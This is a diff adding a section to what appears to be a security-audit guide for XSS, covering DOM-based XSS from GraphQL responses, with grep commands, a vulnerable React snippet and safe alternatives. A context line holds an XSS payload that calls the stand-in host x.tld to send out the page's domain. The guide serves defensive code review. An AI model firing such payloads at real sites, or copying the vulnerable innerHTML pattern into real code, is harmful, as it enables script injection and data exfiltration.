@@ -108,6 +108,43 @@ results.innerHTML = `<li>${q}</li>`;
 ```
 Exploit: `?q=<img src=x onerror=fetch('//x.tld/'+document.domain)>`
 
+### DOM-based XSS from GraphQL response data
+
+Client-side JavaScript that renders fields from a GraphQL response into the DOM via unsafe sinks without sanitization. A GraphQL API response is an **untrusted source** like any other server response — `data.*` fields may contain attacker-controlled markup. This also covers **stored XSS through GraphQL**: a mutation persists an attacker payload, a later query returns it, and the client renders it unsafely. Server-side resolver HTML/XSS (args → HTML string in resolvers) is covered in `graphql_injection.md`.
+
+**Vulnerable conditions**:
+- GraphQL response fields (`data.*`, nested objects, list items) flow to `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, React `dangerouslySetInnerHTML`, Vue `v-html`, Angular `[innerHTML]` / `bypassSecurityTrustHtml`, or jQuery `.html()` without sanitization
+- Client treats response JSON as trusted because it originated from the application's own API endpoint
+- Stored path: mutation persists HTML/script payload; subsequent query or subscription delivers it to clients that inject raw response values into the DOM
+- GraphQL client call (`useQuery`, `useMutation`, `gql`, client `query`/`mutate`, `fetch('/graphql')`) paired with an unsafe HTML sink in the same component, effect, or callback chain
+
+**Grep seeds**:
+```bash
+rg -n "dangerouslySetInnerHTML|v-html|\[innerHTML\]|bypassSecurityTrustHtml|\.innerHTML\s*=|\.html\(|insertAdjacentHTML|document\.write" --glob '*.{js,jsx,ts,tsx,vue}'
+rg -n "useQuery|useMutation|useLazyQuery|gql|apolloClient|client\.query|client\.mutate|fetch\(['\"]/?graphql" --glob '*.{js,jsx,ts,tsx,vue}' -l | xargs rg -n "innerHTML|dangerouslySetInnerHTML|v-html|\.html\(|insertAdjacentHTML"
+rg -n "data\.\w+.*innerHTML|response\.data|result\.data" --glob '*.{js,jsx,ts,tsx,vue}' -C3
+```
+
+**VULN**:
+```jsx
+const { data } = useQuery(GET_COMMENT);
+useEffect(() => {
+  if (data?.comment?.body) {
+    document.getElementById('content').innerHTML = data.comment.body;
+  }
+}, [data]);
+```
+
+**SAFE**:
+```jsx
+const { data } = useQuery(GET_COMMENT);
+return <div>{data?.comment?.body}</div>;   // framework auto-escaping
+// or: el.textContent = data.comment.body;
+// or: el.innerHTML = DOMPurify.sanitize(data.comment.body);
+```
+
+**Cross-ref**: resolver-layer reflected/stored XSS — `graphql_injection.md`; CSP and Trusted Types as defense-in-depth when HTML sinks cannot be eliminated — `content_security_policy.md`.
+
 ### Mutation XSS
 
 Leverage browser parser repair behavior to transform safe-looking markup into executable code (e.g., noscript, malformed tags):
